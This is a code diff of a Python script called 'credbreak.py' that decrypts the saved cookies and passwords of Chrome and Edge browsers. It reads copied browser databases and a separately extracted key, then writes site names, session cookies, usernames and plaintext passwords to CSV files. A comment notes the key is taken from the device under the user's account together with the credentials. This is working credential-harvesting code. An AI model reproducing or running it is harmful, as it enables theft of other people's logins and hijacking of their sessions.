@@ -1,5 +1,5 @@
 # Chrome / Edge cookie & password decrypter 
-# Should take cookie file, password file, state file
+# Should take cookie file, password file, key extracted from state file
 # python3 ./credbreak.py 
 import os
 import json
@@ -22,12 +22,12 @@ def get_chrome_datetime(chromedate):
         return ""
 
 def get_encryption_key(state_path):
-
+    # We do not generate the key from state file as this should be taken from the device at the same time as the credentials under their user account.
     with open("./chrome_key","rb") as f:
         mkey = f.read()
+        f.close()
     print(mkey)
     return mkey
-    #return win32crypt.CryptUnprotectData(key,None,None,None,0)[1]
 
 def decrypt_data(data, key):
     try:
@@ -43,28 +43,38 @@ def sort_cookies(key, cookie_path):
     db.text_factory = lambda b: b.decode(errors="ignore")
     cursor = db.cursor()
     cursor.execute("SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies")
-    with open("./exported_cookies.csv","a") as f:
-        f.write("host_key,name,cookie,expires\n")
-        for host_key, name, value, encrypted_value, expires_utc in cursor.fetchall():
-            if not value:
-                decrypted_value = decrypt_data(encrypted_value, key)
+    print("GENERATING COOKIE CSV...")
+    with open("./cookies.csv","a",encoding="utf-8") as cocsv:
+        cocsv.write("Host,Name,Value,Expires\n")
+        cocsv.close()
+    for host_key, name, value, encrypted_value, expires_utc in cursor.fetchall():
+        if not value:
+            decrypted_value = decrypt_data(encrypted_value, key)
+        else:
+            decrypted_value = value
+
+        with open("./cookies.csv","a",encoding="utf-8") as cocsv:
+            if not expires_utc:
+                cocsv.write(host_key+","+name+","+decrypted_value+","+"NO EXPIRE\n")
             else:
-                decrypted_value = value
-        f.write(host_key+","+name+","+decrypted_value+","+str(get_chrome_datetime(expires_utc)))
-        f.close()
+                cocsv.write(host_key+","+name+","+decrypted_value+","+str(get_chrome_datetime(expires_utc))+"\n")
+            cocsv.close()
+
 
 def sort_passwords(key,password_path):
     db = sqlite3.connect(password_path)
     db.text_factory = lambda b: b.decode(errors="ignore")
     cursor = db.cursor()
     cursor.execute("SELECT signon_realm, username_value, password_value FROM logins")
-    with open("./exported_passwords.csv","a") as f:
-        f.write("Website, Username, Password\n")
-        for signon_realm, username_value, password_value in cursor.fetchall():
-            decrypted_value = decrypt_data(password_value, key)
-        f.write(signon_realm+","+username_value+","+decrypted_value)
-        f.close()
-
+    print("GENERATING PASSWORD CSV...")
+    with open("./passwords.csv","a",encoding="utf-8") as cocsv:
+        cocsv.write("Realm,Username,Password\n")
+        cocsv.close()
+    for signon_realm, username_value, password_value in cursor.fetchall():
+        decrypted_value = decrypt_data(password_value, key)
+        with open("./passwords.csv","a",encoding="utf-8") as cocsv:
+            cocsv.write(signon_realm+","+username_value+","+decrypted_value+"\n")
+            cocsv.close()
 def main():
     key = get_encryption_key("./chrome_state")
     sort_cookies(key,"./google_cookies")
